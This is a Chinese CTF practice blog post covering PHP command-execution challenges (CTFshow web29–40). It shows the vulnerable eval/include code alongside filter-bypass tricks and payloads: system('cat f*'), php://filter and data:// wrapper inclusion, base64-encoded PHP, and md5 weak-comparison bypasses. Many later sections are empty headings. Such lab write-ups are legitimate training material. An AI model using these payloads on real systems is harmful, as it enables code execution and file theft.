
  <!DOCTYPE html>
  <html lang="en"  >
  <head>
  <meta charset="utf-8">
  

  

  

  
  <title>
    
    Hexo
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="preload" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;">
  
<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css">
<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css">

  <link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;"><link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;"><link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;">
  
<link rel="stylesheet" href="/css/loader.css">

  <meta name="description" content="2024-02-25刷题日志2024 hackgame week 2 复现考点：命令执行首先想到的是命令执行：  ls发现可以命令执行   然后再操作得到，直接可以命令注入，发现flag字符被ban了，但不能直接注入，包裹反引号直接RCE。 ctfshow命令执行参考来源：CTFshow web入门 (命令执行） - NPFS - 博客园 (cnblogs.com) web291234567891">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2024/02/27/2024-02-25%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%97/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="2024-02-25刷题日志2024 hackgame week 2 复现考点：命令执行首先想到的是命令执行：  ls发现可以命令执行   然后再操作得到，直接可以命令注入，发现flag字符被ban了，但不能直接注入，包裹反引号直接RCE。 ctfshow命令执行参考来源：CTFshow web入门 (命令执行） - NPFS - 博客园 (cnblogs.com) web291234567891">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/image-20240225185438285.png">
<meta property="og:image" content="c:\Users\%E9%99%86%E6%99%BA%E7%A5%A5\AppData\Roaming\Typora\typora-user-images\image-20240225190252643.png">
<meta property="og:image" content="c:\Users\%E9%99%86%E6%99%BA%E7%A5%A5\AppData\Roaming\Typora\typora-user-images\image-20240225190847933.png">
<meta property="og:image" content="c:\Users\%E9%99%86%E6%99%BA%E7%A5%A5\AppData\Roaming\Typora\typora-user-images\image-20240225204634028.png">
<meta property="og:image" content="http://example.com/AppData/Roaming/Typora/typora-user-images/image-20240227123709899.png">
<meta property="og:image" content="http://example.com/AppData/Roaming/Typora/typora-user-images/image-20240227001942746.png">
<meta property="og:image" content="http://example.com/AppData/Roaming/Typora/typora-user-images/image-20240227002224132.png">
<meta property="og:image" content="http://example.com/images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20240227133801.png">
<meta property="article:published_time" content="2024-02-27T05:23:22.760Z">
<meta property="article:modified_time" content="2024-02-27T05:40:23.191Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/image-20240225185438285.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="https://npm.webcache.cn/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">

  
  
  
  
  
<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>

  
    
<link rel="stylesheet" href="https://npm.webcache.cn/wowjs@1.1.3/css/libs/animate.css">

    
<script src="https://npm.webcache.cn/wowjs@1.1.3/dist/wow.min.js"></script>

    <script>
      new WOW({
        offset: 0,
        mobile: true,
        live: false
      }).init();
    </script>
  
  
    <script src="/sw.js"></script>
  
<meta name="generator" content="Hexo 7.1.1"></head>

  <body>
    
  <div id='loader'>
    <div class="loading-left-bg"></div>
    <div class="loading-right-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi">
        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
          <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
        </svg>
      </div>
      <div class="loading-word">少女祈祷中...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    const startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    const endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('load', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script>


    <div id="container">
      <div id="wrap">
        <div id="header-nav">
  <nav id="main-nav">
    
      <span class="main-nav-link-wrap">
        <span class="main-nav-icon"></span>
        <a class="main-nav-link" href="/">Home</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <span class="main-nav-icon"></span>
        <a class="main-nav-link" href="/archives">Archives</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <span class="main-nav-icon"></span>
        <a class="main-nav-link" href="/about">About</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <span class="main-nav-icon"></span>
        <a class="main-nav-link" href="/friend">Friend</a>
      </span>
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
    
    
    
  </nav>
</div>
<header id="header">
  
    <img fetchpriority="high" src="/images/banner.jpg" alt="">
  
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div id="logo-wrap">
        
          
          
            <a href="/" id="logo">
              <h1>Hexo</h1>
            </a>
          
        
      </div>
      
        
        <h2 id="subtitle-wrap">
          
        </h2>
      
    </div>
  </div>
</header>

        <div id="content" class="outer">
          
          <section id="main"><article id="post-2024-02-25刷题日志" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-inner">
    <div class="article-meta">
      <div class="article-date wow slideInLeft">
  <a href="/2024/02/27/2024-02-25%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%97/" class="article-date-link">
    <time datetime="2024-02-27T05:23:22.760Z" itemprop="datePublished">2024-02-27</time>
  </a>
</div>

      

    </div>
    <div class="hr-line"></div>
    

    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="2024-02-25刷题日志"><a href="#2024-02-25刷题日志" class="headerlink" title="2024-02-25刷题日志"></a>2024-02-25刷题日志</h2><h3 id="2024-hackgame-week-2-复现"><a href="#2024-hackgame-week-2-复现" class="headerlink" title="2024 hackgame week 2 复现"></a>2024 hackgame week 2 复现</h3><h4 id="考点：命令执行"><a href="#考点：命令执行" class="headerlink" title="考点：命令执行"></a>考点：命令执行</h4><p>首先想到的是命令执行：</p>
<p><img src="/images/image-20240225185438285.png" alt="image-20240225185438285"></p>
<p>ls发现可以命令执行</p>
<p><img src="C:\Users\陆智祥\AppData\Roaming\Typora\typora-user-images\image-20240225190252643.png" alt="image-20240225190252643"></p>
<p><img src="C:\Users\陆智祥\AppData\Roaming\Typora\typora-user-images\image-20240225190847933.png" alt="image-20240225190847933"></p>
<p>然后再操作得到，直接可以命令注入，发现flag字符被ban了，但不能直接注入，包裹反引号直接RCE。</p>
<h3 id="ctfshow命令执行"><a href="#ctfshow命令执行" class="headerlink" title="ctfshow命令执行"></a>ctfshow命令执行</h3><p>参考来源：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13797436.html">CTFshow web入门 (命令执行） - NPFS - 博客园 (cnblogs.com)</a></p>
<h4 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>过滤了flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *</span><br><span class="line">? 匹配任何一个字符（不在括号内时）?代表任意1个字符 ls file 0</span><br><span class="line">[abcd] 匹配abcd中任何一个字符</span><br><span class="line">[a-z] 表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;PAYLOAD:c&#x3D;system(‘cat f*’);&#x3D;&#x3D;</p>
<h4 id="web-30"><a href="#web-30" class="headerlink" title="web 30"></a>web 30</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这里是把system 过滤但是有2很多命令执行的函数</p>
<p>&#x3D;&#x3D;命令执行函数&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>

<h4 id="web-31"><a href="#web-31" class="headerlink" title="web 31"></a>web 31</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;空格绕过&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt; &lt;&gt; 重定向符</span><br><span class="line">%09(需要php环境)</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>

<p>cat被过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br></pre></td></tr></table></figure>



<h4 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>过滤了flag,system,php,cat,sort,shell,echo,分号，空格，单引号，括号，空格，&#96;,.</p>
<p><img src="C:\Users\陆智祥\AppData\Roaming\Typora\typora-user-images\image-20240225204634028.png" alt="image-20240225204634028"></p>
<p>采用伪协议的方式</p>
<h4 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>filter伪协议:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[url]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h4 id="Web-34"><a href="#Web-34" class="headerlink" title="Web 34"></a>Web 34</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同34</p>
<h4 id="web-35"><a href="#web-35" class="headerlink" title="web 35"></a>web 35</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>同34</p>
<h4 id="web-37"><a href="#web-37" class="headerlink" title="web 37"></a>web 37</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>采用伪协议的方法</p>
<p>方法一：<br>flag使用*绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php echo system(&#x27;cat fl*&#x27;);?&gt;</span><br><span class="line">?c=data://text/plain,&lt;?php%20 system(&#x27;cat fl*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>


<p>查看源码即可得到flag<br>方法二：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>base64解码为<?php system('cat flag.php');?><br>查看源码即可得到flag</p>
<h4 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过滤了flag,限制了.php后缀</p>
<p>为了减少闭合，所以采用的是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php echo system(&#x27;cat fl*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="web-40"><a href="#web-40" class="headerlink" title="web 40"></a>web 40</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">无参数文件读取</span><br><span class="line">无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a(&#x27;b&#x27;)或a(&#x27;b&#x27;,&#x27;c&#x27;)，不能带参数</span><br><span class="line"></span><br><span class="line">print_r(scandir(&#x27;.&#x27;))</span><br><span class="line">可以用来查看当前目录所有文件名</span><br><span class="line"></span><br><span class="line">但是我们这里说的是要构造无参数的函数，所以我们要做的就是去掉这个点号</span><br><span class="line"></span><br><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">current() 函数返回数组中的当前元素（单元）,默认取第一个值，</span><br><span class="line">pos() 同 current() ,是current()的别名</span><br><span class="line">reset() 函数返回数组第一个单元的值，如果数组为空则返回 FALSE</span><br><span class="line">**localeconv() ** 函数 返回数组的第一项就是 . (小数点)，如下图</span><br></pre></td></tr></table></figure>

<p>我们可以发现flag.php在数组的倒数第二个值里，我们可以通过 array_reverse 进行逆转数组，然后用next()函数进行下一个值的读取，记得成功读取flag.php文件</p>
<p>payload:?c&#x3D;highlight_flie(next(array_reverse(scandir(current(localeconv())))));</p>
<h4 id="web41"><a href="#web41" class="headerlink" title="&#x3D;&#x3D;web41&#x3D;&#x3D;"></a>&#x3D;&#x3D;web41&#x3D;&#x3D;</h4><h4 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h4><h3 id="NSS命令执行（题单第二页）"><a href="#NSS命令执行（题单第二页）" class="headerlink" title="NSS命令执行（题单第二页）"></a>NSS命令执行（题单第二页）</h3><h4 id="5-CISCN-2019华东南-Web11"><a href="#5-CISCN-2019华东南-Web11" class="headerlink" title="5 [CISCN 2019华东南]Web11"></a>5 [CISCN 2019华东南]Web11</h4><h4 id="3090-UUCTF-2022-新生赛-ez-rce"><a href="#3090-UUCTF-2022-新生赛-ez-rce" class="headerlink" title="3090 [UUCTF 2022 新生赛]ez_rce"></a>3090 [UUCTF 2022 新生赛]ez_rce</h4><h4 id="2036-NISACTF-2022-level-up"><a href="#2036-NISACTF-2022-level-up" class="headerlink" title="2036 [NISACTF 2022]level-up"></a>2036 [NISACTF 2022]level-up</h4><h4 id="497-广东强网杯-2021-个人组-欢迎参加强网杯"><a href="#497-广东强网杯-2021-个人组-欢迎参加强网杯" class="headerlink" title="497 [广东强网杯 2021 个人组]欢迎参加强网杯"></a>497 [广东强网杯 2021 个人组]欢迎参加强网杯</h4><h4 id="1421-羊城杯-2020-easycon"><a href="#1421-羊城杯-2020-easycon" class="headerlink" title="1421 [羊城杯 2020]easycon"></a>1421 [羊城杯 2020]easycon</h4><h4 id="2883-SWPUCTF-2022-新生赛-1z-unserialize"><a href="#2883-SWPUCTF-2022-新生赛-1z-unserialize" class="headerlink" title="2883 [SWPUCTF 2022 新生赛]1z_unserialize"></a>2883 [SWPUCTF 2022 新生赛]1z_unserialize</h4><h4 id="2826-SWPUCTF-2022-新生赛-ez-rce"><a href="#2826-SWPUCTF-2022-新生赛-ez-rce" class="headerlink" title="2826 [SWPUCTF 2022 新生赛]ez_rce"></a>2826 [SWPUCTF 2022 新生赛]ez_rce</h4><h4 id="3345-MoeCTF-2022-baby-file"><a href="#3345-MoeCTF-2022-baby-file" class="headerlink" title="3345 [MoeCTF 2022]baby_file"></a>3345 [MoeCTF 2022]baby_file</h4><h5 id="考点：伪协议"><a href="#考点：伪协议" class="headerlink" title="考点：伪协议"></a>考点：伪协议</h5><p><img src="/../../AppData/Roaming/Typora/typora-user-images/image-20240227123709899.png" alt="image-20240227123709899"></p>
<h4 id="1379-GKCTF-2021-easycms"><a href="#1379-GKCTF-2021-easycms" class="headerlink" title="1379 [GKCTF 2021]easycms"></a>1379 [GKCTF 2021]easycms</h4><h4 id="2884-SWPUCTF-2022-新生赛-xff"><a href="#2884-SWPUCTF-2022-新生赛-xff" class="headerlink" title="2884 [SWPUCTF 2022 新生赛]xff"></a>2884 [SWPUCTF 2022 新生赛]xff</h4><h4 id="1897-NISACTF-2022-middlerce"><a href="#1897-NISACTF-2022-middlerce" class="headerlink" title="1897 [NISACTF 2022]middlerce"></a>1897 [NISACTF 2022]middlerce</h4><h4 id="2604-HUBUCTF-2022-新生赛-HowToGetShell"><a href="#2604-HUBUCTF-2022-新生赛-HowToGetShell" class="headerlink" title="2604 [HUBUCTF 2022 新生赛]HowToGetShell"></a>2604 [HUBUCTF 2022 新生赛]HowToGetShell</h4><h4 id="364-天翼杯-2021-esay-eval"><a href="#364-天翼杯-2021-esay-eval" class="headerlink" title="364 [天翼杯 2021]esay_eval"></a>364 [天翼杯 2021]esay_eval</h4><h4 id="2641-SWPUCTF-2022-新生赛-webdog1-start"><a href="#2641-SWPUCTF-2022-新生赛-webdog1-start" class="headerlink" title="2641 [SWPUCTF 2022 新生赛]webdog1__start"></a>2641 [SWPUCTF 2022 新生赛]webdog1__start</h4><h5 id="考点：md5的绕过，robot"><a href="#考点：md5的绕过，robot" class="headerlink" title="考点：md5的绕过，robot"></a>考点：md5的绕过，robot</h5><p><img src="/../../AppData/Roaming/Typora/typora-user-images/image-20240227001942746.png" alt="image-20240227001942746"></p>
<p>弱比较情况下（即你看到的”&#x3D;&#x3D;”）：</p>
<p>一般这种情况下的md5绕过是传入0e开头的md5值或者数组，因为在弱比较时，会把非同类型类型转换为同类型进行比较，在字符串类型下弱比较中会截取一个字符串前面的数字，直到遇到字符截止，对于0e+数字的值只会截取e之前的0，当然你用什么123a&#x3D;123b也是可以绕过</p>
<p>所以等号两边同传0e开头时，在弱比较时候就变成了0&#x3D;0</p>
<p>数组绕过原理是因为两边都是数组，在转换时候为false，false&#x3D;false所以绕过，当然这里强比较也可以用数组绕过</p>
<p>**在出题人那里找到了加密后仍为0e的</p>
<p>所以我们选取0e或者加密后仍为0e开头的数就行例如：0e215962017、以及这些纯字符串转化后为0e+数字的数:QNKCDZO、s878926199a</p>
<h5 id="第二个考点是robots-txt"><a href="#第二个考点是robots-txt" class="headerlink" title="第二个考点是robots.txt"></a>第二个考点是robots.txt</h5><p>输入后出现了乱码的情况，出题人的解决办法是alt间后修改文字格式</p>
<h4 id=""><a href="#" class="headerlink" title=""></a><img src="/../../AppData/Roaming/Typora/typora-user-images/image-20240227002224132.png" alt="image-20240227002224132"></h4><p>最后简单代码审计后命令执行即可</p>
<h5 id="考点：日志文件包含"><a href="#考点：日志文件包含" class="headerlink" title="考点：日志文件包含"></a>考点：日志文件包含</h5><p>疑问： 日志包含的UA头是什么</p>
<p>为什么可以日志包含</p>
<p>在ua头里面传码在hackerbar如何操作</p>
